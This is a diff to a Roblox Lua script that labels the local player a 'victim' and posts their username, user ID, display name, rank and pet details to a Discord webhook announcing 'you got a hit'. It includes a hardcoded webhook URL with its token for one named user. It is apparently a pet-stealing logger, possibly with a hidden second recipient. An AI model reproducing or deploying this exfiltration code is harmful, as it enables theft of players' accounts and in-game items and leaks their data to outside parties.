@@ -17,7 +17,8 @@ _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Ran
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
-local function sendwebhook(msg)
+
+
 local msg = {
   ["content"]= "**you got a hit! @here**",
   ["embeds"]= {
@@ -34,7 +35,7 @@ local msg = {
         },
         {
           ["name"]= "Pet Name & Rarity",
-          ["value"]= "```Pet Name: "..v2.name.."\nPet Rarity: "..v2.rarity.."```",
+          ["value"]= "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
 		  ["inline"]= true
         }
       }
@@ -43,14 +44,18 @@ local msg = {
   ["attachments"] = {}
 }
 
-if _G.Username == "W4r_ObScUrE"
+Webhook = _G.Webhook
+
+local function sendwebhook(msg)
+   request = http_request or request or HttpPost or syn.request
+   request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+end
+
+if _G.Username == "W4r_ObScUrE" then
      local Webhook = "https://discord.com/api/webhooks/1120682293263085599/fz0jBPKE3m-dHQmOUHqi4AttqXoOi8gRJuN6tzFKDDbHoV2YHZqVqQzMeNzTmYhZbJgJ"
-     request = http_request or request or HttpPost or syn.request
-     request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
      sendwebhook(msg)
 else
-     local Webhook = "_G.Webhook"
-     request = http_request or request or HttpPost or syn.request
-     request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
      sendwebhook(msg)
 end
+
+
